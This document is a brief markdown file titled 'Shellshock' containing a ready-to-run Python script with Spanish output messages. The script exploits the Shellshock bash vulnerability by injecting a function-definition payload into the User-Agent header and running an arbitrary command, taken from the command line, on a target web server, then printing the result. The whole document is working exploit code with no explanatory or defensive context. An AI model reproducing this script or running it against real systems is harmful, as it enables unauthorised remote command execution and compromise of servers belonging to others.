# Shellshock

```python
import requests
import sys
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

def shellshock_attack(url, cmd):
    headers = {
        'User-Agent': f'() {{ :; }}; echo; /bin/bash -c "{cmd}"'
    }
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            print("\n" + Fore.GREEN + "[+] Comando ejecutado exitosamente\n")
            print("Output:\n")
            print(response.text)
        else:
            print(Fore.RED + f"[-] La solicitud falló con el código de estado: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print("\n" + Fore.RED + f"[-] Error en la conexión: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 shellshock.py <URL> <comando>")
        sys.exit(1)

    url = sys.argv[1]
    command = sys.argv[2]
    shellshock_attack(url, command)
```
